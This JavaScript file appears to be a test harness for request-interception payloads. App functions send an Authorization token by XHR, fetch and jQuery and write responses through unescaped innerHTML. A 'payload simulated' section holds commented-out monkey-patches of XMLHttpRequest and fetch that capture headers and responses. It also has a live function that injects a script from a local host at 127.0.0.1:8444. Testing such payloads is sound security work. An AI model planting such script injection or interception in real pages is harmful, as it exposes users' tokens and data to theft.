
//  "App" JavaScript
function xhrGetAnswer()
{
	console.log("Sending XHR request...");

	var authtoken = localStorage.getItem("Authorization");

	request = new XMLHttpRequest();
	request.open("POST", "/api/xhrAnswer");
	request.responseType = "json";
	request.setRequestHeader("Content-type", "application/json; charset=UTF-8");
	request.setRequestHeader("Authorization", authtoken);

	var jsonData = new Object();
	jsonData["request"] = "answer";
	var jsonString = JSON.stringify(jsonData);
	request.send(jsonString);

	request.onload = function() {
		var jsonResponse = request.response;

		var status = request.status;

		var answer = jsonResponse.answer;

		// console.log("Get XHR answer: " + answer);

		var answerSpot = document.getElementById("answerHeader");
		answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
	};
}



async function fetchGetAnswer()
{
	console.log("Sending Fetch request...");

	var authtoken = localStorage.getItem("Authorization");

	var req = await fetch('/api/fetchAnswer', {
		method:"POST",
		body: JSON.stringify({
			'request': 'answer'
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8",
			"Authorization": authtoken
		}
	});

	var jsonResponse = await req.json();
	var answer = jsonResponse.answer;

	// console.log("Got fetch answer: " + answer);

	var answerSpot = document.getElementById("answerHeader");
	answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
}



async function jqueryGetAnswer()
{
	console.log("Sending jQuery request...");

	var authtoken = localStorage.getItem("Authorization");

	$(document).ready(function() {
    // Data to be sent in the POST request
		var requestData = {
			request: "answer"
		};

		$.ajax({
			type: "POST",
			url: "/api/jqueryAnswer",
			data: JSON.stringify(requestData),
			contentType: "application/json; charset=utf-8",
			headers: {
				"Authorization": authtoken
			},
			dataType: "json",
			success: function(responseData) {
            // Handle the successful response here
				// console.log("Response received:", responseData);
				var answer = responseData.answer;
				var answerSpot = document.getElementById("answerHeader");
				answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
			},
			error: function(error) {
            // Handle errors here
				console.error("Error:", error);
			}
		});
	});
}



// ****************************************************************
//  Payload simulated code below

function monkeyPatchPrototype()
{

	// // XHR Part
	// const xhrOriginalOpen      = XMLHttpRequest.prototype.open;
	// const xhrOriginalSetHeader = XMLHttpRequest.prototype.setRequestHeader;
	// const xhrOriginalSend      = XMLHttpRequest.prototype.send;

	// console.log("!! Throwing monkey wrenches");


	// //Monkey patch open
	// XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
	// {
	// 	var method = arguments[0];
	// 	var url = arguments[1];

	// 	console.log("Intercepted XHR open: " + method + ", " + url);
	// 	xhrOriginalOpen.apply(this, arguments);
	// }



	// // Monkey patch setRequestHeader
	// XMLHttpRequest.prototype.setRequestHeader = function (header, value)
	// {
	// 	var header = arguments[0];
	// 	var value  = arguments[1];

	// 	console.log("Intercepted Header = " + header + ": " + value);

	// 	xhrOriginalSetHeader.apply(this, arguments);
	// }


  	// // Monkey patch send
	// XMLHttpRequest.prototype.send = function(data) 
	// {
	// 	console.log("Intercepted request body: " + data);


	// 	this.onreadystatechange = function()
	// 	{
	// 		if (this.readyState === 4)
	// 		{
	// 			var data;

	// 			if (!this.responseType || this.responseType === "text") 
	// 			{
	// 				data = this.responseText;
	// 			} 
	// 			else if (this.responseType === "document") 
	// 			{
	// 				data = this.responseXML;
	// 			} 
	// 			else if (this.responseType === "json") 
	// 			{
	// 				data = JSON.stringify(this.response);
	// 			} 
	// 			else 
	// 			{
	// 				data = xhr.response;
	// 			}

	// 			// var response = read_body(this);
	// 			console.log("Intercepted response: " + data);
	// 		}
	// 	};

	// 	xhrOriginalSend.apply(this, arguments);
	// }



	// // Fetch part

	// const originalFetch = window.fetch;

	// // Monkey patch all the fetch things
	// window.fetch = function (url, options)
	// {
	// 	console.log("Intercepted fetch: " + url, options);


	// 	console.log("Intercepted fetch request: " + options.method + ", " + url);

	// 	const headers = new Headers(options.headers);

	// 	headers.forEach((value, name) => 
	// 	{
	// 		console.log("Intercepted header = " + name + ":" + value);
	// 	});

	// 	return originalFetch.call(window, url, options).then((response) => 
	// 	{
	// 		// console.log("Intercepted fetch response: " + response.text());

	// 		const contentType = response.headers.get('content-type');


	// 		if (contentType && contentType.includes('application/json')) 
	// 		{
    //    			// Parse the response as JSON and return the promise
	// 			return response.json();
	// 		} 
	// 		else 
	// 		{
    //     		// Return the response as text
	// 			return response.text();
	// 		}
	// 	}).then((data) => 
	// 	{
	// 		console.log("Intercepted fetch response, phase 2: " + data);
	// 		return data;
	// 	}).catch((error) => 
	// 	{
	// 		console.error("Fetch error:" + error);
	// 		throw error;
	// 	});
	// };
}


function injectPayload()
{
	document.head.appendChild(Object.assign(document.createElement('script'),
		{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));

}




function initSession()
{
	localStorage.setItem("Authorization", "SLEEVELESS_IN_SEATTLE_123");
}




initSession();

